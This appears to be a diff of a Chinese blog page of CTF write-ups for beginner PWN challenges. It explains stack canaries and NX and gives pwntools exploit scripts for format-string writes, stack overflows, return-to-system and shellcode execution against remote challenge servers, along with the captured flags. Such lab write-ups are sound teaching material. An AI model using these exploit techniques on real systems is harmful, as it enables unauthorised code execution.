@@ -7,8 +7,7 @@
 
 CGfsb首先是PWN题的常规起手式 查壳查保护 捎带着看下程序信息发现无壳 但是存在Canary保护和NX保护
 
-                
-   ">
+这里先讲一下什么是Canary保护Can">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -483,48 +482,14 @@ CGfsb首先是PWN题的常规起手式 查壳查保护 捎带着看下程序信�
 <blockquote>
 <p>近期笨逼菜鸡开始接触PWN 刷了刷攻防世界的题目 在这里记录下自己的学习成果</p>
 </blockquote>
-<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>首先是PWN题的常规起手式 查壳查保护 捎带着看下程序信息<br>发现无壳 但是存在Canary保护和NX保护</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928183818798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
-                <p></p>
-            </figure>
-
+<h2 id="CGfsb"><a href="#CGfsb" class="headerlink" title="CGfsb"></a>CGfsb</h2><p>首先是PWN题的常规起手式 查壳查保护 捎带着看下程序信息<br>发现无壳 但是存在Canary保护和NX保护<br><img src="https://img-blog.csdnimg.cn/20190928183818798.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt></p>
 <blockquote>
-<p>这里先讲一下什么是Canary保护<br>Canary保护主要是用来防护栈溢出的 在开启Canary保护程序调用函数的时候 会在栈中压入一个随机Canary值 在函数结束的时候程序会判断Canary值是否发生变动 如果发生变动就认为是程序遭到了攻击 程序直接异常退出 Canary值通常和函数返回地址在栈中相连 主要是防护攻击者更改程序返回地址来执行shellcode<br>这里我们直接拿本题做例子</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928185413790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
-                <p></p>
-            </figure>可以明确看到程序现在在存储Canary值 我们在数据下硬件读写断点 然后让程序跑起来
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928185721986.png" alt title class>
-                <p></p>
-            </figure>这里在函数末尾取出Canary值 如果与刚开始的值不一致 执行stack_chk_fail函数 
-<p>对于如何绕过Canary保护 基本思路是利用各种漏洞 先泄漏出来Canary的地址 然后取出值 等溢出过后再还原 当然具体如何利用还得就题论题</p>
+<p>这里先讲一下什么是Canary保护<br>Canary保护主要是用来防护栈溢出的 在开启Canary保护程序调用函数的时候 会在栈中压入一个随机Canary值 在函数结束的时候程序会判断Canary值是否发生变动 如果发生变动就认为是程序遭到了攻击 程序直接异常退出 Canary值通常和函数返回地址在栈中相连 主要是防护攻击者更改程序返回地址来执行shellcode<br>这里我们直接拿本题做例子<br><img src="https://img-blog.csdnimg.cn/20190928185413790.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt>可以明确看到程序现在在存储Canary值 我们在数据下硬件读写断点 然后让程序跑起来<br><img src="https://img-blog.csdnimg.cn/20190928185721986.png" alt>这里在函数末尾取出Canary值 如果与刚开始的值不一致 执行stack_chk_fail函数<br>对于如何绕过Canary保护 基本思路是利用各种漏洞 先泄漏出来Canary的地址 然后取出值 等溢出过后再还原 当然具体如何利用还得就题论题</p>
 </blockquote>
 <blockquote>
 <p>同时也讲一下NX保护吧 NX保护一般是不可绕过的 他是禁止了栈执行 也就是即使你写入了shellcode 但是如果NX保护开启的话 也是不能在栈上执行的</p>
 </blockquote>
-<p>回到本题 先随便执行下 就是输入用户名和留言 然后程序原样打印出来</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928190438694.png" alt title class>
-                <p></p>
-            </figure>
-<p>没什么世纪大发现 那就常规操作 载入IDA吧</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928190601948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
-                <p></p>
-            </figure>
-<p>发现程序存在格式化字符串漏洞 然后理解下程序逻辑 简单来说就是将pwnme变量的值更改为8就能拿到flag了 双击pwnme看一下 发现pwnme变量还是一个在bss段的全局变量 那基本思路已经有了</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928190855410.png" alt title class>
-                <p></p>
-            </figure>
-<p>解法基本就是通过格式化字符串漏洞更改pwnme的值了 那第一步就是测试程序的回显位了 这里我的回显位是在第十位</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928191119916.png" alt title class>
-                <p></p>
-            </figure>
-<p>那基本信息获取的差不多了 就可以开始编写脚本了</p>
+<p>回到本题 先随便执行下 就是输入用户名和留言 然后程序原样打印出来<br><img src="https://img-blog.csdnimg.cn/20190928190438694.png" alt><br>没什么世纪大发现 那就常规操作 载入IDA吧<br><img src="https://img-blog.csdnimg.cn/20190928190601948.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>发现程序存在格式化字符串漏洞 然后理解下程序逻辑 简单来说就是将pwnme变量的值更改为8就能拿到flag了 双击pwnme看一下 发现pwnme变量还是一个在bss段的全局变量 那基本思路已经有了<br><img src="https://img-blog.csdnimg.cn/20190928190855410.png" alt><br>解法基本就是通过格式化字符串漏洞更改pwnme的值了 那第一步就是测试程序的回显位了 这里我的回显位是在第十位<br><img src="https://img-blog.csdnimg.cn/20190928191119916.png" alt><br>那基本信息获取的差不多了 就可以开始编写脚本了</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48339"</span><span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"please tell me your name:"</span><span class="token punctuation">)</span>
@@ -535,34 +500,10 @@ payload<span class="token operator">=</span>p32<span class="token punctuation">(
 
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>执行脚本即可</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928191836485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
-                <p></p>
-            </figure>
-<p>得到flag:cyberpeace{bb8c9af83fb8e8913ed25c1d5cc41751}</p>
-<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p>照例 日常开局…</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928193518639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
-                <p></p>
-            </figure>
-<p>跑一下 没啥思路 直接载入IDA吧</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928193555812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
-                <p></p>
-            </figure>
-<p>简单理解下 就是程序要求变量v5的值最后为1926 而程序开始的输入不允许输入1926…初看是自相矛盾的..话说哪道Pwn题给的初始条件不是自相矛盾的… 在代码中发现gets函数..因为gets函数不会限制输入的字符个数 初步怀疑是栈溢出 双击v4查看程序栈图</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928193834619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
-                <p></p>
-            </figure>
-<p>没跑了 栈溢出 直接开始写脚本吧</p>
+<p>执行脚本即可<br><img src="https://img-blog.csdnimg.cn/20190928191836485.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>得到flag:cyberpeace{bb8c9af83fb8e8913ed25c1d5cc41751}</p>
+<h2 id="when-did-you-born"><a href="#when-did-you-born" class="headerlink" title="when_did_you_born"></a>when_did_you_born</h2><p>照例 日常开局…<br><img src="https://img-blog.csdnimg.cn/20190928193518639.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>跑一下 没啥思路 直接载入IDA吧<br><img src="https://img-blog.csdnimg.cn/20190928193555812.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>简单理解下 就是程序要求变量v5的值最后为1926 而程序开始的输入不允许输入1926…初看是自相矛盾的..话说哪道Pwn题给的初始条件不是自相矛盾的… 在代码中发现gets函数..因为gets函数不会限制输入的字符个数 初步怀疑是栈溢出 双击v4查看程序栈图<br><img src="https://img-blog.csdnimg.cn/20190928193834619.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt><br>没跑了 栈溢出 直接开始写脚本吧</p>
 <blockquote>
-<p>这里解释下为什么程序开启了Canary保护依然可以使用栈溢出漏洞 这是因为Canary保护主要是防护函数的返回地址不被篡改的 从这里程序的栈图就能看出 Canary值的变量名就是var_8 如果我们切换到汇编窗口 就能看到最后的校验使用的就是这个var_8变量</p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928194120774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt title class>
-                <p></p>
-            </figure>
+<p>这里解释下为什么程序开启了Canary保护依然可以使用栈溢出漏洞 这是因为Canary保护主要是防护函数的返回地址不被篡改的 从这里程序的栈图就能看出 Canary值的变量名就是var_8 如果我们切换到汇编窗口 就能看到最后的校验使用的就是这个var_8变量<br><img src="https://img-blog.csdnimg.cn/20190928194120774.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NDU0MDI4Ng==,size_16,color_FFFFFF,t_70" alt></p>
 </blockquote>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"45209"</span><span class="token punctuation">)</span>
@@ -574,30 +515,10 @@ payload<span class="token operator">=</span><span class="token string">"A"</span
 
 sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>执行即可 </p>
-<figure class="image-box">
-                <img src="https://img-blog.csdnimg.cn/20190928205109233.png" alt title class>
-                <p></p>
-            </figure>
-<p>得到flag:cyberpeace{5f65371d87fafa327d2c0d3e254cfab5}</p>
-<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>正常起手式 查保护</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H03408bfb2a394554a5da866c4afb5f6d2.png" alt title class>
-                <p></p>
-            </figure>
-
-<p>就开着NX保护 载入IDA看下</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Haafee49ea83e4c7daceca7c1ff7ba19eh.png" alt title class>
-                <p></p>
-            </figure>
-
-<p>简单理解下逻辑 就是判断一个程序中没有涉及到的变量 然后判断他的值 这明显就是在暗示是溢出 双击 dword_60106C看一下位置 发现是在bss段的全局变量 </p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Ha6fea8becfaf4d178c61ad6ebe4b3e12A.png" alt title class>
-                <p></p>
-            </figure>
-
+<p>执行即可<br><img src="https://img-blog.csdnimg.cn/20190928205109233.png" alt><br>得到flag:cyberpeace{5f65371d87fafa327d2c0d3e254cfab5}</p>
+<h2 id="hello-pwn"><a href="#hello-pwn" class="headerlink" title="hello_pwn"></a>hello_pwn</h2><p>正常起手式 查保护<br><img src="https://ae01.alicdn.com/kf/H03408bfb2a394554a5da866c4afb5f6d2.png" alt></p>
+<p>就开着NX保护 载入IDA看下<br><img src="https://ae01.alicdn.com/kf/Haafee49ea83e4c7daceca7c1ff7ba19eh.png" alt></p>
+<p>简单理解下逻辑 就是判断一个程序中没有涉及到的变量 然后判断他的值 这明显就是在暗示是溢出 双击 dword_60106C看一下位置 发现是在bss段的全局变量<br><img src="https://ae01.alicdn.com/kf/Ha6fea8becfaf4d178c61ad6ebe4b3e12A.png" alt></p>
 <p>同时发现 程序主体中读入的变量和dword_60106C 仅相差4个字节的位置 而程序主体读入的大小是10个字节 确定此处存在溢出 直接编写脚本即可</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 a<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"33618"</span><span class="token punctuation">)</span>
@@ -606,37 +527,13 @@ a<span class="token punctuation">.</span>recvline<span class="token punctuation"
 payload<span class="token operator">=</span><span class="token number">4</span><span class="token operator">*</span><span class="token string">'A'</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x6E756161</span><span class="token punctuation">)</span>
 a<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 a<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>运行脚本获得结果</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/He5cc965499c84899b125e4cf23ba4067T.png" alt title class>
-                <p></p>
-            </figure>
-
+<p>运行脚本获得结果<br><img src="https://ae01.alicdn.com/kf/He5cc965499c84899b125e4cf23ba4067T.png" alt></p>
 <p>得到flag:cyberpeace{57c7b3fd167ec0630431800825423de0}</p>
-<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>老样子 先查保护 发现除了NX全关 尝试着运行下程序 连个回显都没有 啥都看不出来 载入IDA</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H517f8a13e257412d9d6384d16df45a62Q.png" alt title class>
-                <p></p>
-            </figure>
-
-<p>发现主函数空空如也 有点头疼</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H3c2accf3c7744312b8eca1af4a1a8544u.png" alt title class>
-                <p></p>
-            </figure>
-
-<p>但是发现在函数表中 有个敏感函数<em>callsystem</em></p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H7e89a7b80e54402bb3bdbe3df90d89b71.png" alt title class>
-                <p></p>
-            </figure>
-
+<h2 id="level0"><a href="#level0" class="headerlink" title="level0"></a>level0</h2><p>老样子 先查保护 发现除了NX全关 尝试着运行下程序 连个回显都没有 啥都看不出来 载入IDA<br><img src="https://ae01.alicdn.com/kf/H517f8a13e257412d9d6384d16df45a62Q.png" alt></p>
+<p>发现主函数空空如也 有点头疼<br><img src="https://ae01.alicdn.com/kf/H3c2accf3c7744312b8eca1af4a1a8544u.png" alt></p>
+<p>但是发现在函数表中 有个敏感函数<em>callsystem</em><br><img src="https://ae01.alicdn.com/kf/H7e89a7b80e54402bb3bdbe3df90d89b71.png" alt></p>
 <p>菜鸡此时就有点思路了 应该是劫持返回地址 然后让程序执行到callsystem函数 那么继续在主函数跟下去</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H2fafe4eb2bf444938173a2e4900c9fc7U.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H2fafe4eb2bf444938173a2e4900c9fc7U.png" alt></p>
 <p>这个read就很明显了 read了200个字节..双击buf看下栈图<br>这里截不下图就不截了..简单算一下 80+8=88个字节 而程序读入100个字节 那就是溢出了…同时这里程序的地址随机化是关着的…不多说..开始写脚本吧..</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"35202"</span><span class="token punctuation">)</span>
@@ -645,31 +542,13 @@ payload<span class="token operator">=</span><span class="token string">"a"</span
 sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
 <p>运行脚本得到结果 注意 因为程序是执行了 <em>/bin/sh</em>也就是打开了个终端 需要我们自己去执行获得flag..别说了..刚开始菜鸡等了半天..</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Ha764f1cb5400434a968e2aaf0cdbf41cw.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Ha764f1cb5400434a968e2aaf0cdbf41cw.png" alt></p>
 <p>得到flag:cyberpeace{c07387d32eabb849023878563a5400ef}</p>
-<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>习惯性起手式</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hc6b5266b6cb14cf395076de26d6e009ci.png" alt title class>
-                <p></p>
-            </figure>
-
+<h2 id="level-2"><a href="#level-2" class="headerlink" title="level 2"></a>level 2</h2><p>习惯性起手式<br><img src="https://ae01.alicdn.com/kf/Hc6b5266b6cb14cf395076de26d6e009ci.png" alt></p>
 <p>一样没有开地址随机化 直接载入IDA </p>
 <p><img src="https://ae01.alicdn.com/kf/Hce1df255f000422f9bb805cb6d16c2b7V.png" alt></p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H4584d6b417144896b3663437a7cb38aeI.png" alt title class>
-                <p></p>
-            </figure>
-
-<p>本来没啥头绪 后来发现函数表中有敏感函数<em>system</em> 那大致思路形成 就是和上题差不多 但是我们在覆盖返回地址的同时 直接把栈修改成正常调用system(“/bin/sh”)的样子 同时发现在程序内存中也存有 <em>/bin/sh</em> 那开始写脚本吧</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hf1c2df51b87d40cca5c3cea1ef3b77e42.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H4584d6b417144896b3663437a7cb38aeI.png" alt></p>
+<p>本来没啥头绪 后来发现函数表中有敏感函数<em>system</em> 那大致思路形成 就是和上题差不多 但是我们在覆盖返回地址的同时 直接把栈修改成正常调用system(“/bin/sh”)的样子 同时发现在程序内存中也存有 <em>/bin/sh</em> 那开始写脚本吧<br><img src="https://ae01.alicdn.com/kf/Hf1c2df51b87d40cca5c3cea1ef3b77e42.png" alt></p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
 elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./level_2'</span><span class="token punctuation">)</span>
@@ -684,39 +563,17 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>这里解释下payload吧 因为在函数调用时除去保存现场外 先入栈的就是返回地址 这里的 <em>p32(0)</em> 就是充当返回地址用的 当然因为此处我们直接打开了终端 根本就不需要程序返回 所以随便写就好了 然后就是参数入栈 具体是从左向右 还是从右向左是调用协议规定的 这需要具体程序具体分析 </p>
 </blockquote>
 <p>执行脚本得到结果</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hafe199f5112746a8a6d3ec0c1ac63bf1o.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Hafe199f5112746a8a6d3ec0c1ac63bf1o.png" alt></p>
 <p>flag:cyberpeace{984f929f5fdae818c75ee89278e36753}</p>
-<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>基本起手式 查保护 发现除了地址随机化 其他保护全开</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H4d812ba85367425c97e4366c35709200q.png" alt title class>
-                <p></p>
-            </figure>
-
+<h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><p>基本起手式 查保护 发现除了地址随机化 其他保护全开<br><img src="https://ae01.alicdn.com/kf/H4d812ba85367425c97e4366c35709200q.png" alt></p>
 <p>先尝试着跑了一遍 发现有点像一个古董级别的RPG游戏…没啥思路</p>
-<p>那就不多说了 直接载入IDA吧</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H0b9af83d49574ea0bb152aec87e3395f4.png" alt title class>
-                <p></p>
-            </figure>
-
+<p>那就不多说了 直接载入IDA吧<br><img src="https://ae01.alicdn.com/kf/H0b9af83d49574ea0bb152aec87e3395f4.png" alt></p>
 <p>主函数没啥看的 主要就是泄漏了一个数组的地址 继续向sub_400D72步入</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hd7e0574cc9624bec9e0b0d536347cf0dR.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Hd7e0574cc9624bec9e0b0d536347cf0dR.png" alt></p>
 <p>这里就是常见角色了 稍微步入看下 发现sub_400A7D函数 就是仅仅是在输出和限制我们的选择 如果想继续玩下去就得输入east 没什么好分析的 步入sub_400BB9进行分析 </p>
 <p><img src="https://ae01.alicdn.com/kf/H5d2aa44863bc44a2957223dfad87090aJ.png" alt></p>
 <p>哦吼 看了这么久终于看见一个漏洞 先记录下来 在sub_400BB9中存在格式化字符串漏洞 但是就代码阅读到这里 还是没什么利用思路 继续向下看 终于在sub_400CA6发现关键判断</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H0d55785e0dad447a9633290b4ad3f6c7w.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H0d55785e0dad447a9633290b4ad3f6c7w.png" alt></p>
 <p>通过慢慢查找 发现在函数中比对的 a1和a1[1] 其实就是主函数刚开始泄漏地址的数组 菜鸡这里当时卡了很久…真的不知道if内是在干啥..后来通过大佬指点 看到将指针v1强制转换为函数类型..简单来说就是执行函数</p>
 <p>看到这里那基本思路形成了 首先是需要我们通过格式化字符串漏洞 将刚开始的数组值修改为一样的 然后写入shellcode 最后利用if内语句执行即可 那么首先需要先写脚本看下主机处的回显位</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -735,11 +592,7 @@ sh<span class="token punctuation">.</span>sendline<span class="token punctuation
 <span class="token keyword">print</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 </code></pre>
 <p>运行脚本 这里我的回显位是8</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H2ae5d11d296e408c933d80378f1273bfC.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H2ae5d11d296e408c933d80378f1273bfC.png" alt></p>
 <p>那么接下来就是写脚本利用格式化字符串漏洞了</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 sh<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"111.198.29.45"</span><span class="token punctuation">,</span><span class="token string">"48825"</span><span class="token punctuation">)</span>
@@ -783,25 +636,12 @@ sh<span class="token punctuation">.</span>sendline<span class="token punctuation
 shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">"amd64"</span><span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">"Wizard: I will help you! USE YOU SPELL"</span><span class="token punctuation">,</span>shellcode<span class="token punctuation">)</span>
 sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre>
-<p>运行脚本得到终端 自己cat flag即可</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H76c4f169f6624dbc8e598d09887a382bf.png" alt title class>
-                <p></p>
-            </figure>
-
+<p>运行脚本得到终端 自己cat flag即可<br><img src="https://ae01.alicdn.com/kf/H76c4f169f6624dbc8e598d09887a382bf.png" alt></p>
 <p>得到flag:cyberpeace{d35672c5e758a40ea0c05f6dbbe77015}</p>
 <h2 id="guess-num"><a href="#guess-num" class="headerlink" title="guess_num"></a>guess_num</h2><p>老样子 查保护 看位数</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H1dcd4e82cae14e17b2130dbecfbab142m.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H1dcd4e82cae14e17b2130dbecfbab142m.png" alt></p>
 <p>保护开得很全… 先跑一下 先是输入名字 然后输出自己猜的数…果断GG掉了…那载入IDA吧…</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/H9f1db03916794d03b4ed742e914b8381S.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/H9f1db03916794d03b4ed742e914b8381S.png" alt></p>
 <p>主函数很耿直 几乎没有跳转 跟进sub_C3E看下 发现就是cat flag 那么主要就是主函数的执行了</p>
 <blockquote>
 <p>刚开始菜鸡很是头疼 这个随机数怎么搞定 后来了解了下rand函数的具体原理</p>
@@ -810,11 +650,7 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <p>仔细一看 哦吼..大胆的作者敢用gets读入..八成是溢出了..再配合srand函数的原理 很容易确定思路</p>
 <p>先是利用溢出 覆盖掉种子的值 从而达到控制随机数的目的 那么就开始写脚本吧 首先确定偏移地址</p>
 <p>双击v9进入栈图 我们的目的是覆盖seed的值</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hee09e00f48d64a8da1cf875c501952fbU.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Hee09e00f48d64a8da1cf875c501952fbU.png" alt></p>
 <p>可以简单计算出偏移量是20 那么写出脚本即可</p>
 <pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 <span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
@@ -834,48 +670,21 @@ sh<span class="token punctuation">.</span>interactive<span class="token punctuat
 <blockquote>
 <p>这个脚本的关键就是如何在python中使用c的函数 我选择的解决方法是 使用ctypes库 </p>
 <p>这个库可以方便我们直接在程序中使用C的函数 但是我们首先要确定libc共享库的版本号 这里我是用的是ldd指令进行的查询<br>如果懒的话也可以通过在程序中使用elf.libc来获取</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hbc247d86009a4a3cac2312c5f56843149.png" alt title class>
-                <p></p>
-            </figure>
+<p><img src="https://ae01.alicdn.com/kf/Hbc247d86009a4a3cac2312c5f56843149.png" alt></p>
 </blockquote>
 <p>运行脚本即可</p>
-<figure class="image-box">
-                <img src="https://ae01.alicdn.com/kf/Hb3290098e42744f7ae81df295cbd19ccc.png" alt title class>
-                <p></p>
-            </figure>
-
+<p><img src="https://ae01.alicdn.com/kf/Hb3290098e42744f7ae81df295cbd19ccc.png" alt></p>
